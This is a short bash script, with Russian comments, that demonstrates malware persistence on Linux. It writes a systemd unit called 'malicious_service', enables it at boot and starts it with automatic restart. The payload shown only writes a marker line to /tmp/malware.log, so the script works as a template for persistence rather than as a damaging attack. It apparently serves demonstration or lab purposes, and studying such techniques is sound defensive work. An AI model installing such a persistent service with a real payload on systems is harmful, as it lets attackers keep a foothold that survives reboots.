#!/bin/bash

SERVICE_NAME="malicious_service"
SERVICE_PATH="/etc/systemd/system/$SERVICE_NAME.service"

echo "[+] Creating malicious systemd service..."

# Создаем systemd unit-файл
cat <<EOF > $SERVICE_PATH
[Unit]
Description=Malicious Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'echo "Malicious Code Executed" > /tmp/malware.log'
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Перезагружаем systemd и запускаем сервис
systemctl daemon-reload
systemctl enable $SERVICE_NAME
systemctl start $SERVICE_NAME

echo "[+] Malicious service installed and started!"
